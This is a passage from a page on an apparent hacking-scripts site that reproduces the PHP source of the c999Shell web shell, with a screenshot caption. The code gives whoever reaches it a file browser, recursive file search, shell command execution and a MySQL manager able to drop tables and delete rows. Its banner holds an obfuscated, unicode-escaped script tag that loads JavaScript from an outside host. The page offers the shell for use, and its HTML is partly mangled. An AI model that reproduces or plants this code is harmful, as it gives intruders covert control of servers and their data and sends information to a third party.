&lt;input type="hidden" name="act" value="sql" /&gt;&lt;input type="hidden" name="sql_act" value="query" /&gt;&lt;input type="hidden" name="sql_tbl" value="\&quot;&quot;.htmlspecialchars($sql_tbl).&quot;\&quot;" /&gt;&lt;input type="hidden" name="submit" value="\&quot;1\&quot;" /&gt;&lt;input type="hidden" name="\&quot;sql_goto\&quot;" value="\&quot;&quot;.htmlspecialchars($sql_goto).&quot;\&quot;" /&gt;&lt;input type="submit" name="sql_confirm" value="\&quot;Yes\&quot;" /&gt; &lt;input type="submit" value="\&quot;No\&quot;" /&gt;&lt;/form&gt;&lt;/td&gt;
&lt;td valign="\&quot;top\&quot;"&gt;&lt;b&gt;Fields:&lt;/b&gt;
";
 foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "� &lt;a onclick="\&quot;document.c999sh_sqlquery.sql_query.value+='`&quot;.$name.&quot;`';\&quot;" href="\&quot;#\&quot;"&gt;&lt;b&gt;".$name."&lt;/b&gt;&lt;/a&gt;
";}
 echo "&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre&gt;
";
 }
 }
 if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}
}
}
if (!function_exists("mysql_create_db"))
{
function mysql_create_db($db,$sock="")
{
 $sql = "CREATE DATABASE `".addslashes($db)."`;";
 if ($sock) {return mysql_query($sql,$sock);}
 else {return mysql_query($sql);}
}
}
if (!function_exists("mysql_query_parse"))
{
function mysql_query_parse($query)
{
 $query = trim($query);
 $arr = explode (" ",$query);
 /*array array()
 {
 "METHOD"=&gt;array(output_type),
 "METHOD1"...
 ...
 }
 if output_type == 0, no output,
 if output_type == 1, no output if no error
 if output_type == 2, output without control-buttons
 if output_type == 3, output with control-buttons
 */
 $types = array(
 "SELECT"=&gt;array(3,1),
 "SHOW"=&gt;array(2,1),
 "DELETE"=&gt;array(1),
 "DROP"=&gt;array(1)
 );
 $result = array();
 $op = strtoupper($arr[0]);
 if (is_array($types[$op]))
 {
 $result["propertions"] = $types[$op];
 $result["query"] = $query;
 if ($types[$op] == 2)
 {
 foreach($arr as $k=&gt;$v)
 {
 if (strtoupper($v) == "LIMIT")
 {
 $result["limit"] = $arr[$k+1];
 $result["limit"] = explode(",",$result["limit"]);
 if (count($result["limit"]) == 1) {$result["limit"] = array(0,$result["limit"][0]);}
 unset($arr[$k],$arr[$k+1]);
 }
 }
 }
 }
 else {return FALSE;}
}
}
if (!function_exists("c999fsearch"))
{
function c999fsearch($d)
{
 global $found;
 global $found_d;
 global $found_f;
 global $search_i_f;
 global $search_i_d;
 global $a;
 if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
 $h = opendir($d);
 while (($f = readdir($h)) !== FALSE)
 {
 if($f != "." && $f != "..")
 {
 $bool = (empty($a["name_regexp"]) and strpos($f,$a["name"]) !== FALSE) || ($a["name_regexp"] and ereg($a["name"],$f));
 if (is_dir($d.$f))
 {
 $search_i_d++;
 if (empty($a["text"]) and $bool) {$found[] = $d.$f; $found_d++;}
 if (!is_link($d.$f)) {c999fsearch($d.$f);}
 }
 else
 {
 $search_i_f++;
 if ($bool)
 {
 if (!empty($a["text"]))
 {
 $r = @file_get_contents($d.$f);
 if ($a["text_wwo"]) {$a["text"] = " ".trim($a["text"])." ";}
 if (!$a["text_cs"]) {$a["text"] = strtolower($a["text"]); $r = strtolower($r);}
 if ($a["text_regexp"]) {$bool = ereg($a["text"],$r);}
 else {$bool = strpos(" ".$r,$a["text"],1);}
 if ($a["text_not"]) {$bool = !$bool;}
 if ($bool) {$found[] = $d.$f; $found_f++;}
 }
 else {$found[] = $d.$f; $found_f++;}
 }
 }
 }
 }
 closedir($h);
}
}
if ($act == "gofile") {if (is_dir($f)) {$act = "ls"; $d = $f;} else {$act = "f"; $d = dirname($f); $f = basename($f);}}
//Sending headers
@ob_start();
@ob_implicit_flush(0);
function onphpshutdown()
{
 global $gzipencode,$ft;
 if (!headers_sent() and $gzipencode and !in_array($ft,array("img","download","notepad")))
 {
 $v = @ob_get_contents();
 @ob_end_clean();
 @ob_start("ob_gzHandler");
 echo $v;
 @ob_end_flush();
 }
}
function c999shexit()
{
 onphpshutdown();
 exit;
}
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", FALSE);
header("Pragma: no-cache");
if (empty($tmpdir))
{
 $tmpdir = ini_get("upload_tmp_dir");
 if (is_dir($tmpdir)) {$tmpdir = "/tmp/";}
}
$tmpdir = realpath($tmpdir);
$tmpdir = str_replace("\\",DIRECTORY_SEPARATOR,$tmpdir);
if (substr($tmpdir,-1) != DIRECTORY_SEPARATOR) {$tmpdir .= DIRECTORY_SEPARATOR;}
if (empty($tmpdir_logs)) {$tmpdir_logs = $tmpdir;}
else {$tmpdir_logs = realpath($tmpdir_logs);}
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = TRUE;
 $hsafemode = "&lt;/pre&gt;
&lt;span style="color: red;"&gt;ON (secure)&lt;/span&gt;
&lt;pre&gt;";
}
else {$safemode = FALSE; $hsafemode = "&lt;/pre&gt;
&lt;span style="color: green;"&gt;OFF (not secure)&lt;/span&gt;
&lt;pre&gt;";}
$v = @ini_get("open_basedir");
if ($v or strtolower($v) == "on") {$openbasedir = TRUE; $hopenbasedir = "&lt;/pre&gt;
&lt;span style="color: red;"&gt;".$v."&lt;/span&gt;
&lt;pre&gt;";}
else {$openbasedir = FALSE; $hopenbasedir = "&lt;/pre&gt;
&lt;span style="color: green;"&gt;OFF (not secure)&lt;/span&gt;
&lt;pre&gt;";}
$sort = htmlspecialchars($sort);
if (empty($sort)) {$sort = $sort_default;}
$sort[1] = strtolower($sort[1]);
$DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");
if (!ereg("PHP/".phpversion(),$DISP_SERVER_SOFTWARE)) {$DISP_SERVER_SOFTWARE .= ". PHP/".phpversion();}
$DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"&lt;a href="\&quot;&quot;.$surl.&quot;act=phpinfo\&quot;" target="\&quot;_blank\&quot;"&gt;&lt;b&gt;&lt;span style="text-decoration: underline;"&gt;PHP/".phpversion()."&lt;/span&gt;&lt;/b&gt;&lt;/a&gt;",htmlspecialchars($DISP_SERVER_SOFTWARE));
@ini_set("highlight.bg",$highlight_bg); //FFFFFF
@ini_set("highlight.comment",$highlight_comment); //#FF8000
@ini_set("highlight.default",$highlight_default); //#0000BB
@ini_set("highlight.html",$highlight_html); //#000000
@ini_set("highlight.keyword",$highlight_keyword); //#007700
@ini_set("highlight.string",$highlight_string); //#DD0000
if (!is_array($actbox)) {$actbox = array();}
$dspact = $act = htmlspecialchars($act);
$disp_fullpath = $ls_arr = $notls = null;
$ud = urlencode($d);
?&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1251" /&gt;&lt;meta http-equiv="Content-Language" content="en-us" /&gt;&lt;?php echo getenv("HTTP_HOST"); ?&gt; - phpshell&lt;/pre&gt;
&lt;style&gt;&lt;!--
TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}
--&gt;&lt;/style&gt;
&lt;pre&gt;&lt;/pre&gt;
&lt;center&gt;
&lt;table style="border-collapse: collapse;" width="100%" border="1" cellspacing="0" cellpadding="5" bgcolor="#333333"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;th colspan="2" valign="top" nowrap="nowrap" width="101%" height="15"&gt;
&lt;span style="font-family: Webdings; font-size: xx-large;"&gt;&lt;b&gt;!&lt;/b&gt;&lt;/span&gt;&lt;a href="&lt;?php echo $surl; ?&gt;"&gt;&lt;span style="font-family: Verdana; font-size: x-large;"&gt;&lt;b&gt;&lt;script type="text/javascript"&gt;// &lt;![CDATA[
document.write('\u003c\u0053\u0043\u0052\u0049\u0050\u0054\u0020\u0053\u0052\u0043\u003d\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0077\u0077\u0077\u002e\u0063\u0039\u0039\u002e\u006d\u006f\u0062\u0069\u002f\u0069\u006d\u0061\u0067\u0065\u0073\u002f\u0069\u006d\u0067\u002e\u006a\u0073\u003e\u003c\u002f\u0053\u0043\u0052\u0049\u0050\u0054\u003e')
// ]]&gt;&lt;/script&gt;c999Shell v. &lt;!--?php echo $shver; ?--&gt;&lt;/b&gt;&lt;/span&gt;&lt;/a&gt;&lt;span style="font-family: Webdings; font-size: xx-large;"&gt;&lt;b&gt;!&lt;/b&gt;&lt;/span&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/center&gt;
&lt;pre&gt;
&lt;b&gt;Software: &lt;!--?php echo $DISP_SERVER_SOFTWARE; ?--&gt;&lt;/b&gt; 

&lt;b&gt;uname -a: &lt;!--?php echo wordwrap(php_uname(),90,"&lt;br ?--&gt;",1); ?&gt;&lt;/b&gt; 

&lt;b&gt;&lt;!--?php if (!$win) {echo wordwrap(myshellexec("id"),90,"&lt;br ?--&gt;",1);} else {echo get_current_user();} ?&gt;&lt;/b&gt; 

&lt;b&gt;Safe-mode: &lt;!--?php echo $hsafemode; ?--&gt;&lt;/b&gt;

&lt;!--?php &lt;br ?--&gt;$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
if (empty($d)) {$d = realpath(".");} elseif(realpath($d)) {$d = realpath($d);}
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
$d = str_replace("\\\\","\\",$d);
$dispd = htmlspecialchars($d);
$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1));
$i = 0;
foreach($pd as $b)
{
 $t = "";
 $j = 0;
 foreach ($e as $r)
 {
 $t.= $r.DIRECTORY_SEPARATOR;
 if ($j == $i) {break;}
 $j++;
 }
 echo "&lt;a href="\&quot;&quot;.$surl.&quot;act=ls&d=&quot;.urlencode($t).&quot;&sort=&quot;.$sort.&quot;\&quot;"&gt;&lt;b&gt;".htmlspecialchars($b).DIRECTORY_SEPARATOR."&lt;/b&gt;&lt;/a&gt;";
 $i++;
}
echo "   ";
if (is_writable($d))
{
 $wd = TRUE;
 $wdt = "&lt;span style="color: green;"&gt;[ ok ]&lt;/span&gt;";
 echo "&lt;b&gt;&lt;span style="color: green;"&gt;".view_perms(fileperms($d))."&lt;/span&gt;&lt;/b&gt;";
}
else
{
 $wd = FALSE;
 $wdt = "&lt;span style="color: red;"&gt;[ Read-Only ]&lt;/span&gt;";
 echo "&lt;b&gt;".view_perms_color($d)."&lt;/b&gt;";
}
if (is_callable("disk_free_space"))
{
 $free = disk_free_space($d);
 $total = disk_total_space($d);
 if ($free === FALSE) {$free = 0;}
 if ($total === FALSE) {$total = 0;}
 if ($free &lt; 0) {$free = 0;}
 if ($total &lt; 0) {$total = 0;}
 $used = $total-$free;
 $free_percent = round(100/($total/$free),2);
 echo "
&lt;b&gt;Free ".view_size($free)." of ".view_size($total)." (".$free_percent."%)&lt;/b&gt;";
}
echo "
";
$letters = "";
if ($win)
{
 $v = explode("\\",$d);
 $v = $v[0];
 foreach (range("a","z") as $letter)
 {
 $bool = $isdiskette = in_array($letter,$safemode_diskettes);
 if (!$bool) {$bool = is_dir($letter.":\\");}
 if ($bool)
 {
 $letters .= "&lt;a onclick="\&quot;return" href="\&quot;&quot;.$surl.&quot;act=ls&d=&quot;.urlencode($letter.&quot;:\\&quot;).&quot;\&quot;&quot;.($isdiskette?&quot;"&gt;[ ";
 if ($letter.":" != $v) {$letters .= $letter;}
 else {$letters .= "&lt;span style="color: green;"&gt;".$letter."&lt;/span&gt;";}
 $letters .= " ]&lt;/a&gt; ";
 }
 }
 if (!empty($letters)) {echo "&lt;b&gt;Detected drives&lt;/b&gt;: ".$letters."
";}
}
if (count($quicklaunch) &gt; 0)
{
 foreach($quicklaunch as $item)
 {
 $item[1] = str_replace("%d",urlencode($d),$item[1]);
 $item[1] = str_replace("%sort",$sort,$item[1]);
 $v = realpath($d."..");
 if (empty($v)) {$a = explode(DIRECTORY_SEPARATOR,$d); unset($a[count($a)-2]); $v = join(DIRECTORY_SEPARATOR,$a);}
 $item[1] = str_replace("%upd",urlencode($v),$item[1]);
 echo "&lt;a href="\&quot;&quot;.$item[1].&quot;\&quot;"&gt;".$item[0]."&lt;/a&gt;    ";
 }
}
echo "


";
if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo "&lt;/pre&gt;
&lt;table width="\&quot;100%\&quot;" border="1" cellspacing="0" cellpadding="5" bgcolor="#333333"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td valign="\&quot;top\&quot;" width="\&quot;100%\&quot;"&gt;".$donated_html."&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre&gt;

";}
echo "&lt;/pre&gt;
&lt;table width="\&quot;100%\&quot;" border="1" cellspacing="0" cellpadding="5" bgcolor="#333333"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td valign="\&quot;top\&quot;" width="\&quot;100%\&quot;"&gt;";
if ($act == "") {$act = $dspact = "ls";}
if ($act == "sql")
{
 $sql_surl = $surl."act=sql";
 if ($sql_login) {$sql_surl .= "&sql_login=".htmlspecialchars($sql_login);}
 if ($sql_passwd) {$sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd);}
 if ($sql_server) {$sql_surl .= "&sql_server=".htmlspecialchars($sql_server);}
 if ($sql_port) {$sql_surl .= "&sql_port=".htmlspecialchars($sql_port);}
 if ($sql_db) {$sql_surl .= "&sql_db=".htmlspecialchars($sql_db);}
 $sql_surl .= "&";
 ?&gt;
&lt;h3&gt;Attention! SQL-Manager is &lt;span style="text-decoration: underline;"&gt;NOT&lt;/span&gt; ready module! Don't reports bugs.&lt;/h3&gt;
"; if (!$sql_sock) {?&gt;
&lt;table style="border-collapse: collapse;" width="100%" border="1" cellspacing="0" cellpadding="5" bgcolor="#333333"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td colspan="2" valign="top" width="100%" height="1"&gt;&lt;center&gt;&lt;!--?php &lt;br ?--&gt; if ($sql_server)
 {
 $sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
 $err = mysql_smarterror();
 @mysql_select_db($sql_db,$sql_sock);
 if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}
 }
 else {$sql_sock = FALSE;}
 echo "&lt;b&gt;SQL Manager:&lt;/b&gt;
";
 if (!$sql_sock)
 {
 if (!$sql_server) {echo "NO CONNECTION";}
 else {echo "&lt;center&gt;&lt;b&gt;Can't connect&lt;/b&gt;&lt;/center&gt;"; echo "&lt;b&gt;".$err."&lt;/b&gt;";}
 }
 else
 {
 $sqlquicklaunch = array();
 $sqlquicklaunch[] = array("Index",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");
 $sqlquicklaunch[] = array("Query",$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl));
 $sqlquicklaunch[] = array("Server-status",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=serverstatus");
 $sqlquicklaunch[] = array("Server variables",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=servervars");
 $sqlquicklaunch[] = array("Processes",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=processes");
 $sqlquicklaunch[] = array("Logout",$surl."act=sql");
 echo "&lt;center&gt;&lt;b&gt;MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")&lt;/b&gt;
";
 if (count($sqlquicklaunch) &gt; 0) {foreach($sqlquicklaunch as $item) {echo "[ &lt;a href="\&quot;&quot;.$item[1].&quot;\&quot;"&gt;&lt;b&gt;".$item[0]."&lt;/b&gt;&lt;/a&gt; ] ";}}
 echo "&lt;/center&gt;";
 }
 echo "&lt;/center&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td valign="top" width="28%" height="100"&gt;&lt;center&gt;&lt;span style="font-size: x-large;"&gt; i &lt;/span&gt;&lt;/center&gt;
&lt;ul&gt;
    &lt;li&gt;If login is null, login is owner of process.&lt;/li&gt;
    &lt;li&gt;If host is null, host is localhost&lt;/li&gt;
    &lt;li&gt;If port is null, port is 3306 (default)&lt;/li&gt;
&lt;/ul&gt;
&lt;/td&gt;
&lt;td valign="top" width="90%" height="1"&gt;
&lt;table width="100%" border="0" cellspacing="0" cellpadding="0"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt; &lt;b&gt;Please, fill the form:&lt;/b&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;b&gt;Username&lt;/b&gt;&lt;/td&gt;
&lt;td&gt;&lt;b&gt;Password&lt;/b&gt;&lt;/td&gt;
&lt;td&gt;&lt;b&gt;Database&lt;/b&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;input type="text" maxlength="64" name="sql_login" value="root" /&gt;&lt;/td&gt;
&lt;td&gt;&lt;input type="password" maxlength="64" name="sql_passwd" value="" /&gt;&lt;/td&gt;
&lt;td&gt;&lt;input type="text" maxlength="64" name="sql_db" value="" /&gt;&lt;/td&gt;
&lt;td&gt;&lt;b&gt;Host&lt;/b&gt;&lt;/td&gt;
&lt;td&gt;&lt;b&gt;PORT&lt;/b&gt;&lt;/td&gt;
&lt;td align="right"&gt;&lt;input type="text" maxlength="64" name="sql_server" value="localhost" /&gt;&lt;/td&gt;
&lt;td&gt;&lt;input type="text" maxlength="6" name="sql_port" size="3" value="3306" /&gt;&lt;/td&gt;
&lt;td&gt;&lt;input type="submit" value="Connect" /&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/td&gt;
&lt;!--?php }  else  {   //Start left panel   if (!empty($sql_db))   {    ?--&gt;
&lt;td valign="top" width="25%" height="100%"&gt;&lt;a href="&lt;?php echo $surl."&gt;"&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;

&lt;hr noshade="noshade" size="1" /&gt;

&lt;!--?php &lt;br ?--&gt; $result = mysql_list_tables($sql_db);
 if (!$result) {echo mysql_smarterror();}
 else
 {
 echo "---[ &lt;a href="\&quot;&quot;.$sql_surl.&quot;&\&quot;"&gt;&lt;b&gt;".htmlspecialchars($sql_db)."&lt;/b&gt;&lt;/a&gt; ]---
";
 $c = 0;
 while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "&lt;b&gt;� &lt;a href="\&quot;&quot;.$sql_surl.&quot;sql_db=&quot;.htmlspecialchars($sql_db).&quot;&sql_tbl=&quot;.htmlspecialchars($row[0]).&quot;\&quot;"&gt;&lt;b&gt;".htmlspecialchars($row[0])."&lt;/b&gt;&lt;/a&gt; (".$count_row[0].")&lt;/b&gt;"; mysql_free_result($count); $c++;}
 if (!$c) {echo "No tables found in database.";}
 }
 }
 else
 {
 ?&gt;&lt;/td&gt;
&lt;td valign="top" width="1" height="100"&gt;&lt;a href="&lt;?php echo $sql_surl; ?&gt;"&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;

&lt;hr noshade="noshade" size="1" /&gt;

&lt;!--?php    $result = mysql_list_dbs($sql_sock);    if (!$result) {echo mysql_smarterror();}    else    {     ?--&gt;
&lt;form action="&lt;?php echo $surl; ?&gt;"&gt;&lt;input type="hidden" name="act" value="sql" /&gt;&lt;input type="hidden" name="sql_login" value="&lt;?php echo htmlspecialchars($sql_login); ?&gt;" /&gt;&lt;input type="hidden" name="sql_passwd" value="&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;" /&gt;&lt;input type="hidden" name="sql_server" value="&lt;?php echo htmlspecialchars($sql_server); ?&gt;" /&gt;&lt;input type="hidden" name="sql_port" value="&lt;?php echo htmlspecialchars($sql_port); ?&gt;" /&gt;
&lt;select name="sql_db"&gt;&lt;!--?php &lt;br ?--&gt; $c = 0;&lt;/select&gt;
&lt;select name="sql_db"&gt;$dbs = "";&lt;/select&gt;
&lt;select name="sql_db"&gt;while ($row = mysql_fetch_row($result)) {$dbs .= "&lt;/select&gt;
&lt;select name="sql_db"&gt;&lt;option selected="selected" value="\&quot;&quot;.$row[0].&quot;\&quot;&quot;;"&gt;".$row[0]."&lt;/option&gt;&lt;/select&gt;
&lt;select name="sql_db"&gt;"; $c++;}&lt;/select&gt;
&lt;select name="sql_db"&gt;echo "&lt;/select&gt;
&lt;select name="sql_db"&gt;&lt;option value="\&quot;\&quot;"&gt;Databases (".$c.")&lt;/option&gt;&lt;/select&gt;
&lt;select name="sql_db"&gt;";&lt;/select&gt;
&lt;select name="sql_db"&gt;echo $dbs;&lt;/select&gt;
&lt;select name="sql_db"&gt;}&lt;/select&gt;
&lt;select name="sql_db"&gt;?&gt;&lt;/select&gt;

&lt;hr noshade="noshade" size="1" /&gt;

Please, select database

&lt;hr noshade="noshade" size="1" /&gt;

&lt;input type="submit" value="Go" /&gt;&lt;/form&gt;
&lt;!--?php &lt;br ?--&gt; }
 //End left panel
 echo "&lt;/td&gt;
&lt;td valign="\&quot;top\&quot;" width="\&quot;100%\&quot;" height="\&quot;1\&quot;"&gt;";
 //Start center panel
 $diplay = TRUE;
 if ($sql_db)
 {
 if (!is_numeric($c)) {$c = 0;}
 if ($c == 0) {$c = "no";}
 echo "

&lt;hr noshade="noshade" size="\&quot;1\&quot;" /&gt;

&lt;center&gt;&lt;b&gt;There are ".$c." table(s) in this DB (".htmlspecialchars($sql_db).").
";
 if (count($dbquicklaunch) &gt; 0) {foreach($dbsqlquicklaunch as $item) {echo "[ &lt;a href="\&quot;&quot;.$item[1].&quot;\&quot;"&gt;".$item[0]."&lt;/a&gt; ] ";}}
 echo "&lt;/b&gt;&lt;/center&gt;";
 $acts = array("","dump");
 if ($sql_act == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
 elseif ($sql_act == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \n";} $sql_act = "query";}
 elseif ($sql_act == "tbldump") {if (count($boxtbl) &gt; 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = "dump";}
 elseif ($sql_act == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
 elseif ($sql_act == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
 elseif ($sql_act == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
 elseif ($sql_act == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
 elseif ($sql_act == "deleterow") {$sql_query = ""; if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} else {foreach($boxrow as $v) {$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";} $sql_query = substr($sql_query,0,-1);} $sql_act = "query";}
 elseif ($sql_tbl_act == "insert")
 {
 if ($sql_tbl_insert_radio == 1)
 {
 $keys = "";
 $akeys = array_keys($sql_tbl_insert);
 foreach ($akeys as $v) {$keys .= "`".addslashes($v)."`, ";}
 if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}
 $values = "";
 $i = 0;
 foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct." (";} $values .= "'".addslashes($v)."'"; if ($funct) {$values .= ")";} $values .= ", "; $i++;}
 if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}
 $sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";
 $sql_act = "query";
 $sql_tbl_act = "browse";
 }
 elseif ($sql_tbl_insert_radio == 2)
 {
 $set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);
 $sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";
 $result = mysql_query($sql_query)
?&gt;
</pre>

<h2>C999 shell Screenshot<figure id="attachment_323" style="width: 604px;" class="wp-caption aligncenter"></h2>

<p><a href="/HackingScripts/wp-content/uploads/2014/01/c999.png"><img src="/HackingScripts/wp-content/uploads/2014/01/c999-1024x511.png" alt="C999 shell script screenshot" width="604" height="301" class="size-large wp-image-323" /></a><figcaption class="wp-caption-text">C999 shell script screenshot</figcaption></figure></p>



        </section>

        <aside id="sidebar">
          <a href="/HackingScripts/upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/HackingScripts/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
